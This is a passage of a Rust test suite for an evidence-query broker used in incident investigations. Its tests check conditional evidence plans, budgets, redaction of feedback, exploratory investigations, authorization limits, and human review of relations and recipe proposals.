        asked(&fallback),
        vec!["ci".to_string(), "ci-mirror".to_string()]
    );
    assert!(fallback
        .pack
        .evidence
        .iter()
        .any(|item| item.evidence_type == EvidenceType::CiRun));
}

/** 77. A proposed plan may require evidence under a condition, like a recipe
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn plans_take_conditional_requirements() {
    let scenario = demo::scenario().unwrap();
    let deployment = failed_deployment()
        .steps
        .into_iter()
        .find(|step| step.step_id == "deployment")
        .unwrap();
    let mut request = demo::request(&scenario);
    request.recipe = None;
    request.plan = Some(vec![deployment]);
    request.plan_required = vec![super::broker::recipe::RequiredEvidence {
        evidence_type: EvidenceType::RuntimeLog,
        description: "the logs of a failed deployment".into(),
        when: Predicate::FieldEquals {
            evidence_type: EvidenceType::Deployment,
            field: "status".into(),
            value: "failed".into(),
            subject: Some("{deployment}".into()),
        },
    }];
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(result
        .pack
        .missing_evidence
        .iter()
        .any(|missing| missing.evidence_type == EvidenceType::RuntimeLog));
    assert_eq!(result.pack.status, InvestigationStatus::Incomplete);
}

/** 78. Resolving zone and flow versions respects the step budget
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn version_resolution_respects_the_budget() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.budget.max_steps = 1;
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert_eq!(result.audit.usage.steps, 1);
    assert_eq!(result.pack.status, InvestigationStatus::BudgetExhausted);
}

/** 79. A record observed again by another work episode remembers that episode
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn duplicates_remember_every_episode() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, first) = investigate(&scenario);
    let mut other = demo::request(&scenario);
    other.task_id = Some("PAY-999".into());
    let second = broker
        .investigate(other, &demo::engineer(&scenario))
        .unwrap();
    assert_ne!(first.pack.episode_id, second.pack.episode_id);
    let ci = broker
        .store
        .evidence
        .values()
        .find(|record| record.evidence_type == EvidenceType::CiRun)
        .unwrap();
    assert_eq!(ci.episode_id, first.pack.episode_id);
    assert_eq!(
        ci.observed_in,
        vec![second.pack.episode_id.clone().unwrap()]
    );
}

/** 80. A field condition on evidence that has no fields (text, measurements) is refused
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn field_conditions_need_fields() {
    let refused = super::broker::recipe::from_plan(
        vec![RecipeStep {
            when: Predicate::FieldEquals {
                evidence_type: EvidenceType::RuntimeLog,
                field: "level".into(),
                value: "error".into(),
                subject: None,
            },
            ..failed_deployment().steps[0].clone()
        }],
        Vec::new(),
    );
    assert_eq!(refused.unwrap_err().code, ErrorCode::InvalidRecipe);
}

/** 81. A human reviewer confirms a relation: a reviewed relation is recorded beside the original
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn reviewers_confirm_relations() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, _) = investigate(&scenario);
    let original = relation(
        &broker.store.graph,
        RelationType::Triggered,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::CiRun, "run-5521"),
    )
    .unwrap();
    let mut member = demo::engineer(&scenario);
    member.may_review = false;
    assert_eq!(
        broker
            .store
            .review_relation(&member, &original.relation_id)
            .unwrap_err()
            .code,
        ErrorCode::Unauthorized
    );
    let reviewed = broker
        .store
        .review_relation(&demo::engineer(&scenario), &original.relation_id)
        .unwrap();
    let stored = &broker.store.graph.relations[&reviewed];
    assert_eq!(stored.status, RelationStatus::Reviewed);
    assert_eq!(stored.relation_type, RelationType::Triggered);
    assert_eq!(
        broker.store.graph.relations[&original.relation_id].status,
        RelationStatus::Observed,
        "the original keeps how it was first known"
    );
    assert_eq!(
        broker
            .store
            .review_relation(&demo::engineer(&scenario), &reviewed)
            .unwrap_err()
            .code,
        ErrorCode::InvalidTransition
    );
}

/** 82. A pack cut to its size limit keeps its view consistent: the view holds only kept evidence
 * and its identifier is recomputed
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn sealing_keeps_the_view_consistent() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    // Far smaller than the pack (half of the limit bounds the context view, which shrinks first),
    // so evidence must be left out as well
    request.pack_limits.max_bytes = 6_000;
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(
        result
            .pack
            .warnings
            .iter()
            .any(|warning| warning.kind == WarningKind::Truncation && !warning.refs.is_empty()),
        "the limit is small enough to drop evidence"
    );
    assert_pack_is_closed(&result.pack, "sealed");
    assert_eq!(
        result.pack.context_view.view_id,
        super::correlate::graph::view_identifier(&result.pack.context_view)
    );
    result.pack.verify_manifest().unwrap();
}

/** 83. A contribution past its validity is expired before an investigation reads it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn expired_contributions_are_not_offered() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    let mut proposal = zone_proposal(&result, "refunds", None, Namespace::AgentProposed);
    proposal.valid_until = Some(demo::DEMO_EPOCH + 1);
    let id = broker
        .store
        .propose(&agent, proposal, demo::DEMO_EPOCH)
        .unwrap();
    let later = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    assert_eq!(
        broker.store.contributions.contributions[&id].status,
        ContributionStatus::Expired
    );
    assert!(later
        .pack
        .contributions
        .reusable
        .iter()
        .all(|contribution| contribution.contribution_id != id));
}

/** 84. A question moves through its lifecycle: open, blocked, reopened, answered by a kept pack;
 * an answered question does not move again
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn questions_have_a_lifecycle() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let question = Question {
        question_id: "q-tests".into(),
        text: "Did the tests run against queued jobs?".into(),
        target: TargetRef {
            kind: TargetKind::WorkEpisode,
            id: result.pack.episode_id.clone().unwrap(),
            version: None,
        },
        reason: "tests_passed is unknown".into(),
        relevant_evidence: Vec::new(),
        required_evidence: vec![EvidenceType::TestReport],
        permitted_resources: vec!["ci".into()],
        recipe: None,
        state: QuestionState::Answered,
        asked_by: Actor::new("oncall@acme.example", ActorKind::Human),
        answer_pack: Some("pck_forged".into()),
        created_at: 1,
    };
    let id = broker.store.ask(question.clone()).unwrap();
    assert_eq!(
        broker.store.questions[&id].state,
        QuestionState::Open,
        "asking always opens"
    );
    assert_eq!(broker.store.questions[&id].answer_pack, None);
    assert!(broker.store.ask(question.clone()).is_err(), "asked once");
    assert!(broker
        .store
        .ask(Question {
            question_id: "q-anywhere".into(),
            permitted_resources: Vec::new(),
            ..question
        })
        .is_err());
    assert_eq!(
        broker
            .store
            .set_question_state(&id, QuestionState::Answered, None)
            .unwrap_err()
            .code,
        ErrorCode::EvidenceRequired
    );
    broker
        .store
        .set_question_state(&id, QuestionState::Blocked, None)
        .unwrap();
    broker
        .store
        .set_question_state(&id, QuestionState::Open, None)
        .unwrap();
    broker
        .store
        .set_question_state(&id, QuestionState::Answered, Some(&result.pack.pack_id))
        .unwrap();
    assert_eq!(
        broker.store.questions[&id].answer_pack.as_deref(),
        Some(result.pack.pack_id.as_str())
    );
    assert_eq!(
        broker
            .store
            .set_question_state(&id, QuestionState::Blocked, None)
            .unwrap_err()
            .code,
        ErrorCode::InvalidTransition
    );
}

/** A request of the scenario in a question class no recipe serves
 * Input
    - scenario: &Scenario - scenario
 * Output
    - EvidenceQueryRequest
*/
fn exploration_request(scenario: &Scenario) -> crate::capture::broker::run::EvidenceQueryRequest {
    let mut request = demo::request(scenario);
    request.recipe = None;
    request.investigation_class = "refund-check".into();
    request
}

/** 85. A question no recipe serves is explored: a plan derived from the registry and the sources'
 * discovery, the same for the same registry and request, queried with the known scope values; the
 * pack is Exploratory (never Sufficient), says why, and can be replayed
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn unserved_questions_are_explored() {
    let scenario = demo::scenario().unwrap();
    let policy = demo::engineer(&scenario);
    let mut first = broker(&scenario);
    let result = first
        .investigate(exploration_request(&scenario), &policy)
        .unwrap();
    let again = broker(&scenario)
        .investigate(exploration_request(&scenario), &policy)
        .unwrap();
    let recipe = result.audit.recipe.clone().unwrap();
    assert!(recipe.recipe_id.starts_with(EXPLORATION_PREFIX));
    assert_eq!(
        again.audit.recipe_digest,
        Some(recipe.digest()),
        "the same registry and request give the same exploration"
    );
    assert_eq!(result.pack.status, InvestigationStatus::Exploratory);
    assert!(recipe.required.is_empty() && result.pack.missing_evidence.is_empty());
    let exploration = result.audit.exploration.clone().unwrap();
    assert_eq!(exploration.class, "refund-check");
    assert!(exploration
        .sources
        .iter()
        .any(|source| source.resource_id == "metrics" && !source.status.usable()));
    assert!(exploration
        .notes
        .iter()
        .any(|note| note.starts_with("metrics: discovery failed")));
    let deployments = recipe
        .steps
        .iter()
        .find(|step| step.evidence_type == EvidenceType::Deployment)
        .unwrap();
    assert_eq!(
        deployments.filters.get("deployment").map(String::as_str),
        Some("{deployment}"),
        "a known scope value filters the query"
    );
    assert!(result
        .pack
        .evidence
        .iter()
        .any(|item| item.evidence_type == EvidenceType::Deployment));
    assert!(result.pack.warnings.iter().any(|warning| {
        warning.kind == WarningKind::Uncertainty && warning.message.contains("refund-check")
    }));
    assert!(result.audit.metrics.connector_calls > exploration.sources.len() as u64);
    let replay = first
        .replay(&result.audit.query_id, &policy)
        .expect("an exploration replays");
    assert_eq!(replay.pack.status, InvestigationStatus::Exploratory);
    assert_eq!(replay.audit.recipe_digest, Some(recipe.digest()));
}

/** 86. An exploration obeys authorization like any recipe: a source the actor may not use is not
 * explored, and a record revealing a forbidden environment stops it as Rejected
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn explorations_obey_authorization() {
    let scenario = demo::scenario().unwrap();
    let mut policy = demo::engineer(&scenario);
    policy.actor = Actor::new("contractor@partner.example", ActorKind::Human);
    policy.environments = BTreeSet::from(["staging".to_string()]);
    policy.resources.remove("logs");
    let result = broker(&scenario)
        .investigate(exploration_request(&scenario), &policy)
        .unwrap();
    let exploration = result.audit.exploration.clone().unwrap();
    assert!(exploration
        .sources
        .iter()
        .all(|source| source.resource_id != "logs"));
    assert_eq!(result.pack.status, InvestigationStatus::Rejected);
    assert!(!serde_json::to_string(&result.pack)
        .unwrap()
        .contains("production"));
    assert_pack_is_closed(&result.pack, "contractor exploration");
}

/** 87. With no permitted source to explore, the question is refused, and the refusal is audited
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn nothing_to_explore_is_an_audited_refusal() {
    let scenario = demo::scenario().unwrap();
    let mut policy = demo::engineer(&scenario);
    policy.resources.clear();
    let mut broker = broker(&scenario);
    let before = broker.store.audits.len();
    let error = broker
        .investigate(exploration_request(&scenario), &policy)
        .unwrap_err();
    assert_eq!(error.code, ErrorCode::InvalidRecipe);
    assert!(error.message.contains("no permitted source"));
    assert_eq!(broker.store.audits.len(), before + 1);
    assert_eq!(
        broker.store.audits.last().unwrap().stop_reason,
        StopReason::Rejected
    );
}

/** 88. A person records whether a pack served them: kept beside earlier feedback, redacted, and
 * refused for an agent or an unknown pack
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn people_give_feedback_on_packs() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let pack = result.pack.pack_id.clone();
    let person = Actor::new("oncall@acme.example", ActorKind::Human);
    let before = broker.store.episodes[result.pack.episode_id.as_ref().unwrap()]
        .feedback
        .len();
    let episode = broker
        .store
        .record_feedback(
            &pack,
            &person,
            Truth::No,
            vec![EvidenceType::TestReport, EvidenceType::TestReport],
            "the log had password=Sup3rS3cretValue in it",
            5,
        )
        .unwrap();
    let kept = &broker.store.episodes[&episode].feedback;
    assert_eq!(kept.len(), before + 1, "feedback is added, never replaced");
    let latest = kept.last().unwrap();
    assert_eq!(latest.sufficient, Truth::No);
    assert_eq!(latest.additional_evidence, vec![EvidenceType::TestReport]);
    assert!(!latest.notes.contains("Sup3rS3cretValue"));
    let agent = Actor::new("claude", ActorKind::Agent);
    assert_eq!(
        broker
            .store
            .record_feedback(&pack, &agent, Truth::Yes, Vec::new(), "", 6)
            .unwrap_err()
            .code,
        ErrorCode::Unauthorized
    );
    assert_eq!(
        broker
            .store
            .record_feedback("pck_missing", &person, Truth::Yes, Vec::new(), "", 6)
            .unwrap_err()
            .code,
        ErrorCode::NotFound
    );
}

/** A recipe for the refund-check class, as a learned recipe would be
 * Input
    - None
 * Output
    - EvidenceRecipe
*/
fn learned_recipe() -> super::broker::recipe::EvidenceRecipe {
    let mut recipe = failed_deployment();
    recipe.recipe_id = "learned-refund-check".into();
    recipe.investigation_classes = vec!["refund-check".into()];
    recipe
}

/** 89. A recipe proposal enters the RecipeBook only when an authorized person who did not propose
 * it accepts it; it is then used for its class, kept across stores, and one version can never
 * mean two recipes
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn recipe_proposals_need_a_reviewer() {
    let scenario = demo::scenario().unwrap();
    let directory = tempfile::tempdir().unwrap();
    let mut broker = broker(&scenario);
    broker.store = CaptureStore::open(directory.path()).unwrap();
    let insight = Actor::new("crane-insight", ActorKind::System);
    let proposal =
        RecipeProposal::new(&insight, learned_recipe(), "learned", Vec::new(), None, 1).unwrap();
    let id = broker.store.propose_recipe(proposal.clone()).unwrap();
    assert!(broker.store.propose_recipe(proposal).is_err());
    let mut other = learned_recipe();
    other.description = "other content under the same version".into();
    assert_eq!(
        broker
            .store
            .propose_recipe(
                RecipeProposal::new(&insight, other, "other", Vec::new(), None, 2).unwrap()
            )
            .unwrap_err()
            .code,
        ErrorCode::InvalidRecipe
    );
    let mut exploration = learned_recipe();
    exploration.recipe_id = format!("{EXPLORATION_PREFIX}abc");
    assert!(RecipeProposal::new(&insight, exploration, "", Vec::new(), None, 1).is_err());
    let reviewer = demo::engineer(&scenario);
    let mut agent = reviewer.clone();
    agent.actor = Actor::new("claude", ActorKind::Agent);
    let mut viewer = reviewer.clone();
    viewer.may_review = false;
    let mut proposer = reviewer.clone();
    proposer.actor = Actor::new("crane-insight", ActorKind::Human);
    for (policy, code) in [
        (&agent, ErrorCode::Unauthorized),
        (&viewer, ErrorCode::Unauthorized),
        (&proposer, ErrorCode::SelfApproval),
    ] {
        assert_eq!(
            broker
                .review_recipe(policy, &id, ProposalStatus::Accepted, "looks right")
                .unwrap_err()
                .code,
            code
        );
    }
    assert!(broker.recipes.for_class("refund-check").is_none());
    broker
        .review_recipe(&reviewer, &id, ProposalStatus::Accepted, "what we look at")
        .unwrap();
    assert_eq!(
        broker
            .recipes
            .for_class("refund-check")
            .map(|recipe| recipe.recipe_id.as_str()),
        Some("learned-refund-check")
    );
    assert_eq!(
        broker
            .review_recipe(&reviewer, &id, ProposalStatus::Rejected, "changed my mind")
            .unwrap_err()
            .code,
        ErrorCode::InvalidTransition
    );
    let result = broker
        .investigate(exploration_request(&scenario), &reviewer)
        .unwrap();
    assert_eq!(result.pack.retrieval.recipe_id, "learned-refund-check");
    assert_ne!(result.pack.status, InvestigationStatus::Exploratory);
    // A learned recipe cannot take a class a built-in recipe serves
    let mut clash = learned_recipe();
    clash.recipe_id = "learned-deployment-failure".into();
    clash.investigation_classes = vec!["deployment-failure".into()];
    let clash_id = broker
        .store
        .propose_recipe(RecipeProposal::new(&insight, clash, "clash", Vec::new(), None, 3).unwrap())
        .unwrap();
    assert_eq!(
        broker
            .review_recipe(&reviewer, &clash_id, ProposalStatus::Accepted, "ok")
            .unwrap_err()
            .code,
        ErrorCode::InvalidRecipe
    );
    assert_eq!(
        broker.store.recipe_proposals[&clash_id].status,
        ProposalStatus::Proposed
    );
    broker.store.save().unwrap();
    let reopened = EvidenceQueryBroker::new(
        broker.registry.clone(),
        CaptureStore::open(directory.path()).unwrap(),
        Clock::fixed(demo::DEMO_EPOCH),
    )
    .unwrap();
    assert!(reopened.recipes.for_class("refund-check").is_some());
    assert!(reopened.shadowed.is_empty());
}
